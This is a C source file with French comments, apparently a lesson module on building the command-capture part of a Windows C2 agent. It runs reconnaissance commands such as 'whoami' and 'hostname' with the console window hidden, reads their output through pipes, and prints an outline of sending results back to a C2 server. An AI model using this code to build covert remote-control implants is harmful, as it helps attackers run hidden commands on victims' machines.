/*
 * OBJECTIF  : Capturer la sortie des commandes executees par l'agent
 * PREREQUIS : Pipes, CreateProcess, Redirection I/O
 * COMPILE   : cl example.c /Fe:example.exe
 *
 * L'agent C2 doit executer des commandes et capturer leur sortie
 * (stdout + stderr) pour l'envoyer au serveur. On utilise des
 * pipes anonymes avec CreateProcess pour la redirection.
 */

#include <windows.h>
#include <stdio.h>

void demo_pipe_capture(void) {
    printf("[1] Capture via pipe anonyme + CreateProcess\n\n");

    /* Creer un pipe pour capturer stdout+stderr */
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        printf("    [-] CreatePipe echoue\n\n");
        return;
    }

    /* Empecher le handle de lecture d'etre herite */
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    /* Configurer STARTUPINFO pour rediriger stdout/stderr */
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = "cmd.exe /c whoami & hostname & echo Done";
    printf("    [+] Commande: %s\n", cmd);

    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("    [-] CreateProcess echoue (%lu)\n\n", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    /* Fermer le cote ecriture du pipe (le processus enfant l'utilise) */
    CloseHandle(hWritePipe);

    /* Lire la sortie */
    char buffer[4096] = {0};
    DWORD totalRead = 0, bytesRead = 0;

    while (ReadFile(hReadPipe, buffer + totalRead,
                    sizeof(buffer) - totalRead - 1, &bytesRead, NULL)
           && bytesRead > 0) {
        totalRead += bytesRead;
    }
    buffer[totalRead] = '\0';

    printf("    [+] Sortie capturee (%lu bytes):\n", totalRead);
    printf("    ---\n    %s    ---\n", buffer);

    WaitForSingleObject(pi.hProcess, 5000);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("    [+] Exit code: %lu\n", exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
    printf("\n");
}

void demo_large_output(void) {
    printf("[2] Gestion des sorties volumineuses\n\n");

    /* Demonstrer la lecture incrementale avec buffer dynamique */
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = "cmd.exe /c dir C:\\Windows\\System32\\*.dll";
    printf("    [+] Commande volumineuse: %s\n", cmd);

    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("    [-] CreateProcess echoue\n\n");
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return;
    }
    CloseHandle(hWrite);

    /* Buffer dynamique */
    DWORD bufSize = 4096, totalRead = 0, bytesRead;
    char* output = (char*)malloc(bufSize);
    if (!output) {
        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    while (ReadFile(hRead, output + totalRead,
                    bufSize - totalRead - 1, &bytesRead, NULL)
           && bytesRead > 0) {
        totalRead += bytesRead;
        if (totalRead > bufSize - 1024) {
            bufSize *= 2;
            char* tmp = (char*)realloc(output, bufSize);
            if (!tmp) break;
            output = tmp;
        }
    }
    output[totalRead] = '\0';

    printf("    [+] Total capture: %lu bytes (buffer: %lu)\n", totalRead, bufSize);
    printf("    [+] Premieres lignes:\n");

    /* Afficher les 3 premieres lignes */
    int lines = 0;
    char* p = output;
    while (*p && lines < 3) {
        char* nl = strchr(p, '\n');
        if (nl) {
            *nl = '\0';
            printf("        %s\n", p);
            p = nl + 1;
        } else {
            printf("        %s\n", p);
            break;
        }
        lines++;
    }
    printf("        ...\n");

    free(output);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    printf("\n");
}

void demo_architecture(void) {
    printf("[3] Architecture de capture dans un agent\n\n");
    printf("    C2 envoie: {\"cmd\":\"shell\", \"args\":\"whoami\"}\n\n");
    printf("    Agent :\n");
    printf("    1. CreatePipe()       -> pipe anonyme\n");
    printf("    2. CreateProcess()    -> cmd.exe /c <args>\n");
    printf("       hStdOutput = hWritePipe\n");
    printf("       hStdError  = hWritePipe\n");
    printf("    3. CloseHandle(hWritePipe)\n");
    printf("    4. ReadFile(hReadPipe) -> buffer\n");
    printf("    5. WaitForSingleObject() -> attendre fin\n");
    printf("    6. POST resultat au C2\n\n");
    printf("    Considerations :\n");
    printf("    - Timeout sur WaitForSingleObject (eviter blocage)\n");
    printf("    - Limiter la taille de sortie (eviter OOM)\n");
    printf("    - Chunking pour les gros resultats\n");
    printf("    - CREATE_NO_WINDOW pour cacher la console\n\n");
}

int main(void) {
    printf("[*] Demo : Output Capture pour Agent C2\n");
    printf("[*] ==========================================\n\n");
    demo_pipe_capture();
    demo_large_output();
    demo_architecture();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
